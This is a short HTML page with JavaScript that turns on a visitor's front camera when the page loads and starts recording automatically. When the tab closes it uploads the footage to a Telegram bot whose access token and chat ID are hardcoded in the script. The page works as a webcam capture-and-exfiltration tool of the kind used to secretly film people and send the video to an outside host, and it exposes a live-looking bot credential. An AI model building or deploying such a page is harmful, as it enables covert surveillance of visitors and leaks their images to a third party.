<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Recording and Telegram</title>
    <style>
        #video {
            display: block;
            width: 640px;
            height: 480px;
        }
        #recordedVideo {
            display: block;
            width: 640px;
            height: 480px;
        }
    </style>
</head>
<body>
    <h1>Video Recording and Sending to Telegram</h1>
    <video id="video" autoplay></video>
    <video id="recordedVideo" controls></video>

    <script>
        const video = document.getElementById('video');
        const recordedVideo = document.getElementById('recordedVideo');

        let mediaRecorder;
        let recordedChunks = [];

        // Function to start video
        function startVideo() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                .then(stream => {
                    video.srcObject = stream;
                    setupMediaRecorder(stream);

                    video.onloadedmetadata = () => {
                        // Start recording after a delay to allow the camera to focus
                        setTimeout(() => {
                            mediaRecorder.start();
                            console.log('Recording started');
                        }, 3000);
                    };
                })
                .catch(err => console.error("Error accessing camera: ", err));
        }

        // Function to setup MediaRecorder
        function setupMediaRecorder(stream) {
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                const videoURL = URL.createObjectURL(blob);
                recordedVideo.src = videoURL;
                console.log('Recording stopped. Sending video...');
                sendToTelegram(blob);
            };
        }

        // Function to send video to Telegram
        function sendToTelegram(blob) {
            const token = '7504272107:AAH8rOfaUtOq8xnxWnvQ0s4SriLHkz4nITk'; // Замените на токен вашего бота
            const chatId = '6121166273'; // Замените на ваш chat ID
            const url = `https://api.telegram.org/bot${token}/sendVideo`;

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('video', blob, 'recording.webm');

            fetch(url, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Video sent successfully:', data);
                } else {
                    console.error('Telegram API error:', data.description);
                }
            })
            .catch((error) => console.error('Error sending video to Telegram:', error));
        }

        // Handle browser tab or window close
        window.addEventListener('beforeunload', (event) => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
                console.log('Recording stopped');
                event.preventDefault(); // Required for modern browsers
                event.returnValue = ''; // For some browsers
            }
        });

        // Start video on page load
        window.onload = startVideo;
    </script>
</body>
</html>
